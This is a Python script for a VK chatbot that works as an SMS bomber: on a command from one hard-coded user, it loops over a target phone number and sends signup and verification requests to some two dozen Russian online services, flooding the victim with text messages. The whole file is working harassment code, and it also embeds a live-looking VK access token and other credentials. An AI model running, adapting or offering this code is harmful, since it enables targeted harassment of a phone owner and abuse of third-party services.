try:
    import vk_api, threading, requests
    from vk_api.longpoll import VkLongPoll, VkEventType
    from vk_api.utils import get_random_id


    def text1(arg):
        return arg.split()[1]


    def text2(arg):
        return arg.split()[2]


    def write_message(sender, message):
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id()})


    def spam(phone, ckok, xz, zx_lol):
        o = 0
        while int(ckok) > o:
            o += 1
            try:
                requests.post(
                    "https://api.delitime.ru/api/v2/signup",
                    data={
                        "SignupForm[username]": phone,
                        "SignupForm[device_type]": 3,
                    },
                )

            except:
                pass
            try:
                requests.post(
                    "https://burgerking.ru/middleware/bridge/api/v3/auth/signup",
                    json={"phone": phone, "invite": ""})
            except:
                pass
            try:
                requests.post(
                    "https://msk.tele2.ru/api/validation/number/" + phone,
                    json={"sender": "Tele2"},
                )
            except:
                pass
            try:
                a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
            except:
                pass
            try:
                a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                  json={"reqId": "91101-1606335718",
                                        "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                                   "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})
            except:
                pass
            try:
                a = requests.post("https://youla.ru/web-api/auth/request_code",
                                  json={"phone": phone})
            except:
                pass
            try:
                a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763"
                })
            except:
                pass
            try:
                a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                  json={"phone_number": phone})
            except:
                pass
            try:
                a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                  data={"phone": phone})
            except:
                pass
            try:
                a = requests.post(
                    "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                    data={"st.r.phone": "+" + phone})
            except:
                pass
            try:
                a = requests.post("https://nn-card.ru/api/1.0/register",
                                  json={"phone": phone, "password": 'DDd7873456'})
            except:
                pass
            try:
                a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  json={"CellPhone": phone[1:]})
            except:
                pass
            try:
                a = requests.post(
                    "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                    data={"phone": "+" + phone})
            except:
                pass
            try:
                a = requests.post(
                    "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                    data={"l": phone[1:]})
            except:
                pass
            try:
                a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  data={"CellPhone": phone[1:]})
            except:
                pass
            try:
                a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                  json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                        "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""})
            except:
                pass
            try:
                a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                                  json={"phone": phone[1:], "name": "Егор"})
            except:
                pass
            try:
                a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                  json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                                        "Mobile": phone[1:],
                                        "page": {"pageName": "home", "launchMode": "direct",
                                                 "trafficType": ""}})
            except:
                pass
            try:
                a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
                                  data={"phone": phone})
            except:
                pass
            try:
                a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                                  json={
                                      "phone": "+" + phone,
                                      "api": 2,
                                      "email": 'dgirherfib@gmaqil.com',
                                      "x-email": "x-email",
                                  })
            except:
                pass
            try:
                a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                                  data={
                                      "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                      "username": phone,
                                      "client_id": "android-qw",
                                      "client_secret": "zAm4FKq9UnSe7id",
                                  })
            except:
                pass
            try:
                a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                                  json={"phone": "+" + phone})
            except:
                pass
            try:
                a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                                  json={
                                      "birthday": {"day": 12, "month": 10, "year": 2000},
                                      "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                      "include_verification_code": True,
                                      "password": 'Danil5564554',
                                      "phone_number": phone,
                                      "username": 'bhtrtrrrtbhtrbhtr',
                                  })
            except:
                pass
            try:
                a = requests.post("https://my.telegram.org/auth/send_password",
                                  data={"phone": "+" + phone})
            except:
                pass
            try:
                a = requests.post(
                    'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                    params={'msisdn': phone})
            except:
                pass


    token = "7ad7287aa064dcfc166afad5d76382232daddd2102d089aa0f140cc3b76a2fbdd46bf6404c8520aa8fbbe"
    authorize = vk_api.VkApi(token=token)
    longpoll = VkLongPoll(authorize)
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.to_me:
            # ПРОВЕРКА
            reseived_message = event.text.lower()
            sender = event.user_id
            if sender == 664033661:
                if reseived_message == 'начать':
                    write_message(sender, "Работает!")
                # ОТПРАВКА ЗАПРОСТА СЕРЕЗ ПОТОКИ 
                elif reseived_message[0:2] == '/l':
                    # ПРИМЕР СООБЩЕНИЯ: \l 79287777777 10
                    nomer = text1(reseived_message)
                    ckok = text2(reseived_message)
                    t = threading.Thread(target=spam, args=(nomer, ckok, 1, 2))
                    t.start()
                    write_message(sender, 'Всё ок')
except:
    os.system('python bot.py')
